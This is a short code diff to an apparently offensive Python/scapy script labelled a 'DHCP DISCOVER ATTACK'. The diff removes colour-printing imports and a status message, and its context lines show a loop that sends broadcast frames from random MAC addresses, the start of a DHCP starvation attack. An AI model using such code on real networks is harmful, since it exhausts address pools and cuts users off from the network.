@@ -5,8 +5,6 @@ logging.getLogger("scapy.runtime").setLevel(logging.WARNING)
 from scapy.all import Ether, RandMAC, sendp
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dhcp import BOOTP, DHCP
-from termcolor import colored
-import six
 
 
 def run(interface, verbose):
@@ -15,7 +13,6 @@ def run(interface, verbose):
         inter = str(interface[0])
 
         try:
-            six.print_(colored("[*]", "blue"), "Running DHCP DISCOVER ATTACK...")
             while 1:
                 src_mac = str(RandMAC())
                 ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac, type=0x800)
